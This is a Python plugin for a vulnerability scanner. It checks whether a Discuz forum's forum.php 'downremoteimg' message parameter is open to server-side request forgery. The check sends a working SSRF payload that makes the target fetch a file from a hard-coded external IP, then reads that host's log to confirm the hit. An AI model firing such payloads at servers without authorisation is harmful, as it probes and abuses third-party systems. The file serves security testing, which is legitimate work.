# coding=utf-8
import time
import hashlib
import datetime
import requests


def get_plugin_info():
    plugin_info = {
        "name": "Discuz SSRF漏洞",
        "info": "Discuz论坛forum.php参数message SSRF漏洞,trs infogate插件 blind XML实体注入",
        "level": "中危",
        "type": "SSRF",
        "author": "zhangdaoyuan@banggood.com",
        "url": "https://github.com/Lucifer1993/AngelSword/blob/master/cms/discuz/discuz_forum_message_ssrf.py",
        "keyword": "tag:php",
        "source": 1
    }
    return plugin_info

def check(ip, port, timeout=10):
    url = ip + ':' + port
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
    }
    time_stamp = time.mktime(datetime.datetime.now().timetuple())
    m = hashlib.md5(str(time_stamp).encode(encoding='utf-8'))
    md5_str = m.hexdigest()
    payload = "/forum.php?mod=ajax&action=downremoteimg&message=[img=1,1]http://45.76.158.91:6868/" + md5_str + ".jpg[/img]&formhash=09cec465"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        eye_url = "http://45.76.158.91/web.log"
        time.sleep(6)
        reqr = requests.get(eye_url, timeout=timeout, verify=False)
        if md5_str in reqr.text:
            return u"存在discuz论坛forum.php参数message SSRF漏洞"
    except:
        pass
